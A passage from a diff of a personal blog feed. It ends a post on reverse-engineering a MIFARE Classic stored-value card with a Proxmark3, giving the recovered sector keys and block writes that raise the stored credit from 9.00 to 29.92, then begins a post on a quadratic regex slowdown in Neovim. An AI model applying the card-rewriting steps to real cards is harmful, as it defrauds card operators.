+<span class="o">[</span>BLOCK] <span class="nv">ID</span><span class="o">=</span>9 <span class="nv">S</span><span class="o">=</span>2 <span class="nv">B</span><span class="o">=</span>1
+  <span class="o">[</span><span class="nv">units</span><span class="o">=</span>2]
+    data01: <span class="nv">FULL</span><span class="o">=[</span>84 03] | 00 00 | <span class="o">[</span>7B FC] | FF FF | <span class="o">[</span>84 03] | 00 00 | 09 F6 | 09 F6
+    data02: <span class="nv">FULL</span><span class="o">=[</span>E2 04] | 00 00 | <span class="o">[</span>1D FB] | FF FF | <span class="o">[</span>E2 04] | 00 00 | 09 F6 | 09 F6
+    <span class="o">!</span>+00
+      data01: <span class="nv">RAW</span><span class="o">=</span>84 03 | <span class="nv">INT_LE</span><span class="o">=</span>       900 | <span class="nv">INT_BE</span><span class="o">=</span>     33795 | <span class="nv">NOT_LE</span><span class="o">=</span>     64635 | <span class="nv">NOT_BE</span><span class="o">=</span>     31740 | <span class="nv">BIN</span><span class="o">=</span>0000001110000100 | <span class="nv">BIN_NOT</span><span class="o">=</span>1111110001111011 | <span class="nv">NOT_RAW</span><span class="o">=</span>7B FC
+      data02: <span class="nv">RAW</span><span class="o">=</span>E2 04 | <span class="nv">INT_LE</span><span class="o">=</span>      1250 | <span class="nv">INT_BE</span><span class="o">=</span>     57860 | <span class="nv">NOT_LE</span><span class="o">=</span>     64285 | <span class="nv">NOT_BE</span><span class="o">=</span>      7675 | <span class="nv">BIN</span><span class="o">=</span>0000010011100010 | <span class="nv">BIN_NOT</span><span class="o">=</span>1111101100011101 | <span class="nv">NOT_RAW</span><span class="o">=</span>1D FB
+    <span class="o">!</span>+04
+      data01: <span class="nv">RAW</span><span class="o">=</span>7B FC | <span class="nv">INT_LE</span><span class="o">=</span>     64635 | <span class="nv">INT_BE</span><span class="o">=</span>     31740 | <span class="nv">NOT_LE</span><span class="o">=</span>       900 | <span class="nv">NOT_BE</span><span class="o">=</span>     33795 | <span class="nv">BIN</span><span class="o">=</span>1111110001111011 | <span class="nv">BIN_NOT</span><span class="o">=</span>0000001110000100 | <span class="nv">NOT_RAW</span><span class="o">=</span>84 03
+      data02: <span class="nv">RAW</span><span class="o">=</span>1D FB | <span class="nv">INT_LE</span><span class="o">=</span>     64285 | <span class="nv">INT_BE</span><span class="o">=</span>      7675 | <span class="nv">NOT_LE</span><span class="o">=</span>      1250 | <span class="nv">NOT_BE</span><span class="o">=</span>     57860 | <span class="nv">BIN</span><span class="o">=</span>1111101100011101 | <span class="nv">BIN_NOT</span><span class="o">=</span>0000010011100010 | <span class="nv">NOT_RAW</span><span class="o">=</span>E2 04
+    <span class="o">!</span>+08
+      data01: <span class="nv">RAW</span><span class="o">=</span>84 03 | <span class="nv">INT_LE</span><span class="o">=</span>       900 | <span class="nv">INT_BE</span><span class="o">=</span>     33795 | <span class="nv">NOT_LE</span><span class="o">=</span>     64635 | <span class="nv">NOT_BE</span><span class="o">=</span>     31740 | <span class="nv">BIN</span><span class="o">=</span>0000001110000100 | <span class="nv">BIN_NOT</span><span class="o">=</span>1111110001111011 | <span class="nv">NOT_RAW</span><span class="o">=</span>7B FC
+      data02: <span class="nv">RAW</span><span class="o">=</span>E2 04 | <span class="nv">INT_LE</span><span class="o">=</span>      1250 | <span class="nv">INT_BE</span><span class="o">=</span>     57860 | <span class="nv">NOT_LE</span><span class="o">=</span>     64285 | <span class="nv">NOT_BE</span><span class="o">=</span>      7675 | <span class="nv">BIN</span><span class="o">=</span>0000010011100010 | <span class="nv">BIN_NOT</span><span class="o">=</span>1111101100011101 | <span class="nv">NOT_RAW</span><span class="o">=</span>1D FB
+</code></pre></div></div>
+
+<p>Much cleaner. Each diff-ed unit is also visualised in different encoding (heavily based on <a href="https://imhex.werwolv.net/">ImHex</a>) such as integer little/big-endian, bits, raw bytes and also their respective not-ed representation.</p>
+
+<p>This is where knowing the visible credit value makes the whole thing much easier (almost <a href="https://trivialityspace.github.io/">trivial</a>). In blocks <code class="language-plaintext highlighter-rouge">8</code> and <code class="language-plaintext highlighter-rouge">9</code>, the little-endian interpretation of the changed bytes directly matches the two balances: <code class="language-plaintext highlighter-rouge">9.00</code> and <code class="language-plaintext highlighter-rouge">12.50</code>.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dump  ID*  sector  sector-block  offset  RAW    INT_LE  NOT_LE
+----  ---  ------  ------------  ------  -----  ------  ------
+0900  8    2       0             +00     84 03  &lt;900&gt;   64635
+1250  8    2       0             +00     E2 04  &lt;1250&gt;  64285
+0900  8    2       0             +04     7B FC  64635   &lt;900&gt;
+1250  8    2       0             +04     1D FB  64285   &lt;1250&gt;
+0900  8    2       0             +08     84 03  &lt;900&gt;   64635
+1250  8    2       0             +08     E2 04  &lt;1250&gt;  64285
+0900  9    2       1             +00     84 03  &lt;900&gt;   64635
+1250  9    2       1             +00     E2 04  &lt;1250&gt;  64285
+0900  9    2       1             +04     7B FC  64635   &lt;900&gt;
+1250  9    2       1             +04     1D FB  64285   &lt;1250&gt;
+0900  9    2       1             +08     84 03  &lt;900&gt;   64635
+1250  9    2       1             +08     E2 04  &lt;1250&gt;  64285
+</code></pre></div></div>
+
+<p>*<code class="language-plaintext highlighter-rouge">ID</code> is the global block number.</p>
+
+<p>So it seems the credit value is written a few times, both as little-endian and as its bitwise-not counterpart. That kind of duplication is common in simple stored-value formats: one copy for the value, one inverted copy as a cheap consistency check, and sometimes another repeated copy for redundancy.</p>
+
+<p>Block <code class="language-plaintext highlighter-rouge">6</code> also changes, but I am not sure what it represents. It is probably a timestamp, transaction counter, or some other metadata. To keep the experiment focused, I left block <code class="language-plaintext highlighter-rouge">6</code> alone and only changed the bytes in blocks <code class="language-plaintext highlighter-rouge">8</code> and <code class="language-plaintext highlighter-rouge">9</code> that clearly tracked the balance.</p>
+
+<p>For the test value I used <code class="language-plaintext highlighter-rouge">B0 0B</code>, for mature and scientific reasons. Conveniently, it also maps to a <code class="language-plaintext highlighter-rouge">29.92</code> credit value when interpreted as a little-endian integer:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ssdp conv b00b 2 <span class="nt">--from</span> RAW
+BIN    : 1011000000001011
+BIN_NOT: 0100111111110100
+INT_BE : 45067
+INT_LE : 2992
+NOT_BE : 20468
+NOT_LE : 62543
+NOT_RAW: 4F F4
+RAW    : B0 0B
+</code></pre></div></div>
+
+<p>Before writing anything, I wanted to read the target blocks back directly and keep the relevant sector keys in front of me. From the <code class="language-plaintext highlighter-rouge">autopwn</code> output, sector <code class="language-plaintext highlighter-rouge">2</code> uses trailer block <code class="language-plaintext highlighter-rouge">11</code>, with this key pair:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] <span class="nt">-----</span>+-----+--------------+---+--------------+----
+<span class="o">[</span>+]  Sec | Blk | key A        |res| key B        |res
+<span class="o">[</span>+] <span class="nt">-----</span>+-----+--------------+---+--------------+----
+<span class="o">[</span>+]  000 | 003 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  001 | 007 | A71A0C3102FD | N | B76198135BD9 | N
+<span class="o">[</span>+]  002 | 011 | A49F68AB4733 | N | B4E109EC9C52 | N
+<span class="o">[</span>+]  003 | 015 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  004 | 019 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  005 | 023 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  006 | 027 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  007 | 031 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  008 | 035 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  009 | 039 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  010 | 043 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  011 | 047 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  012 | 051 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  013 | 055 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  014 | 059 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  015 | 063 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+] <span class="nt">-----</span>+-----+--------------+---+--------------+----
+<span class="o">[=]</span> <span class="o">(</span> D:Dictionary / S:darkSide / U:User / R:Reused / N:Nested / H:Hardnested / C:statiCnested / A:keyA  <span class="o">)</span>
+</code></pre></div></div>
+
+<p>Using key A for sector <code class="language-plaintext highlighter-rouge">2</code>, I can read blocks <code class="language-plaintext highlighter-rouge">8</code> and <code class="language-plaintext highlighter-rouge">9</code> directly and verify that they still contain the <code class="language-plaintext highlighter-rouge">9.00</code> balance representation:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>usb] pm3 <span class="nt">--</span><span class="o">&gt;</span> hf mf rdbl <span class="nt">--blk</span> 8 <span class="nt">-k</span> A49F68AB4733
+
+<span class="o">[=]</span>   <span class="c"># | sector 02 / 0x02                                | ascii</span>
+<span class="o">[=]</span> <span class="nt">----</span>+-------------------------------------------------+-----------------
+<span class="o">[=]</span>   8 | 84 03 00 00 7B FC FF FF 84 03 00 00 09 F6 09 F6 | ....<span class="o">{</span>........
+
+<span class="o">[</span>usb] pm3 <span class="nt">--</span><span class="o">&gt;</span> hf mf rdbl <span class="nt">--blk</span> 9 <span class="nt">-k</span> A49F68AB4733
+
+<span class="o">[=]</span>   <span class="c"># | sector 02 / 0x02                                | ascii</span>
+<span class="o">[=]</span> <span class="nt">----</span>+-------------------------------------------------+-----------------
+<span class="o">[=]</span>   9 | 84 03 00 00 7B FC FF FF 84 03 00 00 09 F6 09 F6 | ....<span class="o">{</span>........
+</code></pre></div></div>
+
+<p>The new block value is just the old block with <code class="language-plaintext highlighter-rouge">84 03</code> (<code class="language-plaintext highlighter-rouge">0900</code>) replaced by <code class="language-plaintext highlighter-rouge">B0 0B</code> (<code class="language-plaintext highlighter-rouge">29.92</code>) and <code class="language-plaintext highlighter-rouge">7B FC</code> replaced by <code class="language-plaintext highlighter-rouge">4F F4</code>, the inverted representation:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">block</span> <span class="o">=</span> <span class="sh">"</span><span class="s">84 03 00 00 7B FC FF FF 84 03 00 00 09 F6 09 F6</span><span class="sh">"</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">data</span> <span class="o">=</span> <span class="n">block</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">8403</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">B00B</span><span class="sh">"</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">7BFC</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">4FF4</span><span class="sh">"</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">data</span>
+<span class="sh">'</span><span class="s">B00B00004FF4FFFFB00B000009F609F6</span><span class="sh">'</span>
+</code></pre></div></div>
+
+<p>For this sector, key B is accepted for the write. I wrote the same updated value to both blocks that appeared to hold the balance:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>usb] pm3 <span class="nt">--</span><span class="o">&gt;</span> hf mf wrbl <span class="nt">--blk</span> 8 <span class="nt">-k</span> B4E109EC9C52 <span class="nt">-b</span> <span class="nt">-d</span> B00B00004FF4FFFFB00B000009F609F6
+<span class="o">[=]</span> Writing block no 8, key <span class="nb">type</span>:B - B4E109EC9C52
+<span class="o">[=]</span> data: B0 0B 00 00 4F F4 FF FF B0 0B 00 00 09 F6 09 F6
+<span class="o">[</span>+] Write <span class="o">(</span> ok <span class="o">)</span>
+<span class="o">[</span>?] Hint: Try <span class="sb">`</span>hf mf rdbl<span class="sb">`</span> to verify
+
+<span class="o">[</span>usb] pm3 <span class="nt">--</span><span class="o">&gt;</span> hf mf wrbl <span class="nt">--blk</span> 9 <span class="nt">-k</span> B4E109EC9C52 <span class="nt">-b</span> <span class="nt">-d</span> B00B00004FF4FFFFB00B000009F609F6
+<span class="o">[=]</span> Writing block no 9, key <span class="nb">type</span>:B - B4E109EC9C52
+<span class="o">[=]</span> data: B0 0B 00 00 4F F4 FF FF B0 0B 00 00 09 F6 09 F6
+<span class="o">[</span>+] Write <span class="o">(</span> ok <span class="o">)</span>
+<span class="o">[</span>?] Hint: Try <span class="sb">`</span>hf mf rdbl<span class="sb">`</span> to verifyh
+</code></pre></div></div>
+
+<p>After writing, I dumped the card again and compared the modified dump against the previous <code class="language-plaintext highlighter-rouge">9.00</code> dump. The only intended differences should be in blocks <code class="language-plaintext highlighter-rouge">8</code> and <code class="language-plaintext highlighter-rouge">9</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ssdp diff --units 2 --format mf1k hf-mf-6C2FAC83-dump-xxxx.bin hf-mf-6C2FAC83-dump-0900.bin
+Inputs:
+  data01: hf-mf-6C2FAC83-dump-xxxx.bin
+  data02: hf-mf-6C2FAC83-dump-0900.bin
+
+Diff blocks:
+  [BLOCK] ID=8 S=2 B=0
+  [BLOCK] ID=9 S=2 B=1
+
+[BLOCK] ID=8 S=2 B=0
+  [units=2]
+    data01: FULL=[B0 0B] | 00 00 | [4F F4] | FF FF | [B0 0B] | 00 00 | 09 F6 | 09 F6
+    data02: FULL=[84 03] | 00 00 | [7B FC] | FF FF | [84 03] | 00 00 | 09 F6 | 09 F6
+    !+00
+      data01: RAW=B0 0B | INT_LE=      2992 | INT_BE=     45067 | NOT_LE=     62543 | NOT_BE=     20468 | BIN=0000101110110000 | BIN_NOT=1111010001001111 | NOT_RAW=4F F4
+      data02: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
+    !+04
+      data01: RAW=4F F4 | INT_LE=     62543 | INT_BE=     20468 | NOT_LE=      2992 | NOT_BE=     45067 | BIN=1111010001001111 | BIN_NOT=0000101110110000 | NOT_RAW=B0 0B
+      data02: RAW=7B FC | INT_LE=     64635 | INT_BE=     31740 | NOT_LE=       900 | NOT_BE=     33795 | BIN=1111110001111011 | BIN_NOT=0000001110000100 | NOT_RAW=84 03
+    !+08
+      data01: RAW=B0 0B | INT_LE=      2992 | INT_BE=     45067 | NOT_LE=     62543 | NOT_BE=     20468 | BIN=0000101110110000 | BIN_NOT=1111010001001111 | NOT_RAW=4F F4
+      data02: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
+
+[BLOCK] ID=9 S=2 B=1
+  [units=2]
+    data01: FULL=[B0 0B] | 00 00 | [4F F4] | FF FF | [B0 0B] | 00 00 | 09 F6 | 09 F6
+    data02: FULL=[84 03] | 00 00 | [7B FC] | FF FF | [84 03] | 00 00 | 09 F6 | 09 F6
+    !+00
+      data01: RAW=B0 0B | INT_LE=      2992 | INT_BE=     45067 | NOT_LE=     62543 | NOT_BE=     20468 | BIN=0000101110110000 | BIN_NOT=1111010001001111 | NOT_RAW=4F F4
+      data02: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
+    !+04
+      data01: RAW=4F F4 | INT_LE=     62543 | INT_BE=     20468 | NOT_LE=      2992 | NOT_BE=     45067 | BIN=1111010001001111 | BIN_NOT=0000101110110000 | NOT_RAW=B0 0B
+      data02: RAW=7B FC | INT_LE=     64635 | INT_BE=     31740 | NOT_LE=       900 | NOT_BE=     33795 | BIN=1111110001111011 | BIN_NOT=0000001110000100 | NOT_RAW=84 03
+    !+08
+      data01: RAW=B0 0B | INT_LE=      2992 | INT_BE=     45067 | NOT_LE=     62543 | NOT_BE=     20468 | BIN=0000101110110000 | BIN_NOT=1111010001001111 | NOT_RAW=4F F4
+      data02: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
+</code></pre></div></div>
+
+<figure>
+
+  <picture>
+    
+    <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/blog/2025-10-12/2992-480.webp" />
+    <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/blog/2025-10-12/2992-800.webp" />
+    <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/blog/2025-10-12/2992-1400.webp" />
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/blog/2025-10-12/2992.png" class="img-fluid centered" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture><figcaption class="caption">Credit value after editing bytes in blocks 8 and 9: 29.92</figcaption>
+
+</figure>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>That was enough to confirm the basic layout: the visible balance is stored in blocks <code class="language-plaintext highlighter-rouge">8</code> and <code class="language-plaintext highlighter-rouge">9</code>, repeated as a little-endian value and as its inverted counterpart. The other changed block is still suspicious, but it was not needed to make this specific value update work.</p>
+
+<p>The fun part is how little magic there was once the dumps were side by side. Most of the work was not “breaking” anything, but getting the data into a shape where the pattern could be seen.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Intro]]></summary></entry><entry><title type="html">How I Made Neovim 300x Faster</title><link href="https://fedemengo.github.io/blog/2023/04/nvim-evil-regex/" rel="alternate" type="text/html" title="How I Made Neovim 300x Faster" /><published>2023-04-23T00:00:00+00:00</published><updated>2023-04-23T00:00:00+00:00</updated><id>https://fedemengo.github.io/blog/2023/04/nvim-evil-regex</id><content type="html" xml:base="https://fedemengo.github.io/blog/2023/04/nvim-evil-regex/"><![CDATA[<h2 id="intro">Intro</h2>
+
+<p>For a while, I have been working on a side <a href="https://github.com/fedemengo/d2bist">project</a> that generates files with long sequences of <code class="language-plaintext highlighter-rouge">0</code>s and <code class="language-plaintext highlighter-rouge">1</code>s. Nvim is my primary editor, so I often need to inspect or modify those files. To my great annoyance, whenever a file contained more than a few tens of thousands of bits, nvim would hang for several seconds, minutes, or until I finally SIGKILLed it.</p>
+
+<p>This kept happening, so I tried opening the same file with plain Vim. To my surprise, it opened instantly. Something had to be wrong with my config. After all, adding more and more plugins to nvim undoubtedly makes the editor heavier and slower. It was time to find out what was going on.</p>
 
 <h2 id="how">How</h2>
 
-<p>I never had to debug performance issues in nvim before, so I didn’t really have much to start with. My first suspicion was that the slow down was cause by some plugins. I tried to binary-search the plugin causing problems but even without plugins opening up that file was still slow.</p>
+<p>I had never debugged performance issues in nvim before, so I did not have much to start with. My first suspicion was that the slowdown was caused by a plugin. I tried to binary-search the offending plugin, but even without plugins, opening that file was still slow.</p>
 
-<p>I didn’t havy many other ideas, looking at the helper I discovered the <code class="language-plaintext highlighter-rouge">--startuptime</code> flag. Since I didn’t want to mess up my configuration I launched a docker container, clone and compile nvim. I made sure the problem was still present in the version from master and created an empty <code class="language-plaintext highlighter-rouge">init.lua</code>.</p>
+<p>I did not have many other ideas. Looking through the help, I discovered the <code class="language-plaintext highlighter-rouge">--startuptime</code> flag. Since I did not want to mess up my local configuration, I launched a Docker container, cloned and compiled nvim, verified that the problem was still present on <code class="language-plaintext highlighter-rouge">master</code>, and created an empty <code class="language-plaintext highlighter-rouge">init.lua</code>.</p>
 
-<p>Finally I launched</p>
+<p>Then I ran:</p>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ff1d74dcbc84:~# <span class="nb">time </span>nvim /test/data/data/pi_30_000 <span class="nt">--startuptime</span> vim-startup.log +qall
 
@@ -19,7 +645,7 @@ user    0m6.123s
 sys     0m0.010s
 </code></pre></div></div>
 
-<p>which generated</p>
+<p>which generated:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>times in msec
  clock   self+sourced   self:  sourced script
@@ -47,24 +673,28 @@ sys     0m0.010s
 6048.355  000.003: editing files in windows
 </code></pre></div></div>
 
-<p>Looking at the logs, it’s clear that something bad happened between <code class="language-plaintext highlighter-rouge">029.058</code> and <code class="language-plaintext highlighter-rouge">6048.212</code>. In particular, <code class="language-plaintext highlighter-rouge">require('vim.filetype.detect')</code> took \(\approx 6\) seconds.</p>
+<p>Looking at the logs, it was clear that something bad happened between <code class="language-plaintext highlighter-rouge">029.058</code> and <code class="language-plaintext highlighter-rouge">6048.212</code>. In particular, <code class="language-plaintext highlighter-rouge">require('vim.filetype.detect')</code> took \(\approx 6\) seconds.</p>
 
-<p>Armed with <code class="language-plaintext highlighter-rouge">rg</code> and <code class="language-plaintext highlighter-rouge">fd</code>, after some code diving, I understood what that line did. As the name suggests, it’s used to infer the file type. There are a couple of ways nvim infers the file type. In case it’s not obvious from the extension, it first checks for <a href="https://en.wikipedia.org/wiki/Shebang_(Unix)">shebangs</a> and, if necessary, it attempts to guess the filetype from the file content.</p>
+<p>Armed with <code class="language-plaintext highlighter-rouge">rg</code> and <code class="language-plaintext highlighter-rouge">fd</code>, after some code diving, I understood what that line did. As the name suggests, it is used to infer the file type. Nvim has a couple of ways to do that. If the type is not obvious from the extension, it first checks for <a href="https://en.wikipedia.org/wiki/Shebang_(Unix)">shebangs</a> and, if necessary, tries to guess the file type from the file contents.</p>
 
-<p>And that’s where my problem was. The file contents are fed to a set of regex that, in case of a successful match, assigns a known filetype. For most of the regex, it’s enough to test the first few lines of the file content. In my case, the file was a single long line of characters (30k to be exact). So my first idea was to limit the line each regex has to test to some “reasonable” upper bound, I think I set 1000.</p>
+<p>That was where my problem was. The file contents are fed to a set of regexes that assign a known file type when they match. For most of them, it is enough to test only the first few lines. In my case, the file was a single long line of characters, 30k to be exact. My first idea was to limit the amount of each line that every regex had to test to some “reasonable” upper bound. I think I used 1000 characters.</p>
 
-<p>So I changed that, recompiled nvim, and opened up the file again.</p>
+<p>I changed that, recompiled nvim, and opened the file again.</p>
 
 <p>Yep, the fix worked!</p>
 
-<p>I pushed the fix and opened a PR. After some time, a nvim core maintainer had a chance to look at the fix and mentioned that nvim logic matches vim’s one. So to prevent any major divergence between the two, they suggested I push the fix to vim first, and in case it was accepted, they would port it to nvim. I think that’s only fair.</p>
+<p>I pushed the fix and opened a PR. After some time, an nvim core maintainer looked at it and mentioned that nvim’s logic matches Vim’s. To avoid unnecessary divergence between the two projects, they suggested that I push the fix to Vim first. If it was accepted there, they would port it to nvim. Fair enough.</p>
 
-<p>But could I really push that fix to vim? After all, vim didn’t suffer from this, so it seemed unreasonable to cap the file content to solve performance problems that were not there. I wanted to fix the issue where it made more sense.</p>
+<p>But could I really push that fix to Vim? Vim did not have the same performance problem, so it seemed unreasonable to cap the file content there just to solve an nvim-specific slowdown. I wanted to fix the issue where the fix actually made sense.</p>
 
-<p>After some rubber ducking with ChatGPT and some looking around the internet, I read that vim regex engine is particularly efficient. Nvim, on the other hand, uses Lua’s builtin regex. Could it be that the two had this magnitude of performance difference? Only one way to find out. Let’s write some code to test it.</p>
+<p>After some rubber ducking with ChatGPT and some searching, I read that Vim’s regex engine is particularly efficient. Nvim, on the other hand, uses Lua’s built-in pattern matching for this code path. Could the two really have this much of a performance difference? Only one way to find out: write some code and test it.</p>
 
-<p>So I basically rewrote <a href="https://github.com/neovim/neovim/blob/53f36806f1b5107c0570ffbf57180a8e08f45b2e/runtime/lua/vim/filetype/detect.lua#L1660">this</a> into a script</p>
-<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">local</span> <span class="n">patterns_text</span> <span class="o">=</span> <span class="p">{</span>
+<p>I started from <a href="https://github.com/neovim/neovim/blob/53f36806f1b5107c0570ffbf57180a8e08f45b2e/runtime/lua/vim/filetype/detect.lua#L1660">the relevant nvim filetype detection code</a>.</p>
+
+<details>
+  <summary>So I basically rewrote this into a script and ran it against the file that was causing problems:</summary>
+
+  <div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">local</span> <span class="n">patterns_text</span> <span class="o">=</span> <span class="p">{</span>
     <span class="s2">"^#compdef</span><span class="se">\\</span><span class="s2">&gt;"</span><span class="p">,</span>
     <span class="s2">"^#autoload</span><span class="se">\\</span><span class="s2">&gt;"</span><span class="p">,</span>
     <span class="s2">"^From [a-zA-Z][a-zA-Z_0-9%.=%-]*(@[^ ]*)? .* 19%d%d$"</span><span class="p">,</span>
@@ -137,11 +767,14 @@ sys     0m0.010s
     <span class="n">file</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
     <span class="n">match_from_text</span><span class="p">({</span><span class="n">content</span><span class="p">})</span>
 <span class="k">end</span>
+</code></pre></div>  </div>
+
+</details>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lua test.lua pi_30_000
 </code></pre></div></div>
 
-<p>and run it against the file that was causing me problems <code class="language-plaintext highlighter-rouge">lua test.lua pi_30_000</code></p>
-
-<p>Soon enough I had found the problematic regex</p>
+<p>Soon enough, I found the problematic regex:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curr: '^RCS file:', Time: 0.000s. next: '^CVS:'
 curr: '^CVS:', Time: 0.000s. next: '^CVS: '
@@ -163,31 +796,60 @@ curr: 'TAK 2000', Time: 0.000s. next: 'S Y S T E M S   I M P R O V E D '
 curr: 'S Y S T E M S   I M P R O V E D ', Time: 0.000s. next: 'Run Date: '
 </code></pre></div></div>
 
-<p>The regex <code class="language-plaintext highlighter-rouge">[0-9:%.]* *execve%(</code> equivalent to <code class="language-plaintext highlighter-rouge">[0-9:.]* *execve(</code> without regex escape chars took \(\approx 4.4\) seconds to evaluate, which is crazy considering all the other regexes evaluated instantly. I’m no expert in regexes but I think the issues is with a backtracking explosion. Remember the <a href="https://en.wikipedia.org/wiki/String-searching_algorithm#Naive_string_search">naive string searching</a>?</p>
+<p>The regex <code class="language-plaintext highlighter-rouge">[0-9:%.]* *execve%(</code>, equivalent to <code class="language-plaintext highlighter-rouge">[0-9:.]* *execve(</code> without the regex escape characters, took \(\approx 4.4\) seconds to evaluate. That is wild, considering all the other regexes evaluated instantly. I am no regex expert, but I think the issue was a backtracking explosion. Remember <a href="https://en.wikipedia.org/wiki/String-searching_algorithm#Naive_string_search">naive string searching</a>?</p>
 
-<p>Anyway, the trend was close to quadratic, on paper the regex had to perform \(\sum_{i=1}^N i = \frac{N(N+1)}{2} = O(N^2)\) matches.</p>
+<p>Anyway, the trend was close to quadratic. Fitting the measured startup times gives:</p>
 
-<figure>
+\[t(N) \approx 0.007754 \cdot N^{2.001}\]
 
-  <picture>
-    
-    <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/blog/2023-04-23/nvim-plot-480.webp" />
-    <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/blog/2023-04-23/nvim-plot-800.webp" />
-    <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/blog/2023-04-23/nvim-plot-1400.webp" />
-    
+<p>where \(N\) is the file-size label in thousands of characters and \(t(N)\) is the startup time in seconds. The fitted exponent is effectively \(2\), so the measured behavior is quadratic, or \(O(N^2)\).</p>
 
-    <!-- Fallback to the original file -->
-    <img src="/assets/img/blog/2023-04-23/nvim-plot.png" class="img-fluid rounded" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                   nvim startup: evil regex timing
+      ┌──────────────────────────────────────────────────────────────────────────────────────┐
+7801.9┤ .. N^2                                                                              x│
+      │ xx data                                                                            <span class="nb">.</span> │
+      │                                                                                   <span class="nb">.</span>  │
+      │                                                                                 ..   │
+      │                                                                                <span class="nb">.</span>     │
+6501.7┤                                                                              ..      │
+      │                                                                             <span class="nb">.</span>        │
+      │                                                                           ..         │
+      │                                                                          <span class="nb">.</span>           │
+      │                                                                        x.            │
+      │                                                                       <span class="nb">.</span>              │
+5201.5┤                                                                     ..               │
+      │                                                                    <span class="nb">.</span>                 │
+      │                                                                  ..                  │
+      │                                                                x.                    │
+      │                                                              ..                      │
+3901.3┤                                                           ...                        │
+      │                                                         ..                           │
+      │                                                       ..                             │
+      │                                                     ..                               │
+      │                                                   ..                                 │
+2601.2┤                                                 ..                                   │
+      │                                              ...                                     │
+      │                                            ..                                        │
+      │                                          x.                                          │
+      │                                       ...                                            │
+      │                                    ...                                               │
+1301.0┤                                 ...                                                  │
+      │                             ....                                                     │
+      │                         ....                                                         │
+      │                     x...                                                             │
+      │            .........                                                                 │
